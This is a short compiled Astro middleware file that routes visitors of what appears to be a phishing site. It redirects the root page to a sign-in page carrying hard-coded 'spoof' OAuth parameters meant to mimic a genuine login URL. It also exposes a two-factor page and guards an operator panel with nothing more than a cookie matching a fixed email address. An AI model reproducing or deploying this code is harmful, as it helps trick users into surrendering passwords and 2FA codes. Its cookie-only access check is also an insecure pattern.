import { d as defineMiddleware, s as sequence } from './chunks/index_BnAJI29V.mjs';
import 'es-module-lexer';
import './chunks/astro-designed-error-pages_QoELW0jQ.mjs';
import '@astrojs/internal-helpers/path';
import 'cookie';

const validRoutes = ["/", "/signin", "/signin/2fa", "/panel", "/api"];
const spoofParams = "?client_id=186690b1-94fe-4608-94dea-d35bee334e718&locale=en&oauth_challenge=186690b1-94fe-4608-94dea-d35bee334e718";
const onRequest$1 = defineMiddleware(async (context, next) => {
  const userEmail = context.cookies.get("user_email")?.value;
  const path = context.url.pathname;
  const isValidRoute = validRoutes.some((route) => path.startsWith(route));
  if (!isValidRoute) {
    return context.redirect("/404");
  }
  const getSigninUrl = () => {
    const shouldSpoof = true;
    return shouldSpoof ? `/signin${spoofParams}` : "/signin";
  };
  if (path === "/2fa") {
    return context.redirect("/signin/2fa");
  }
  if (path === "/") {
    return context.redirect(getSigninUrl());
  }
  if (path === "/panel") {
    if (!userEmail || userEmail !== "admin@gmail.com") {
      return context.redirect(getSigninUrl());
    }
  }
  return next();
});

const onRequest = sequence(
	
	onRequest$1
	
);

export { onRequest };
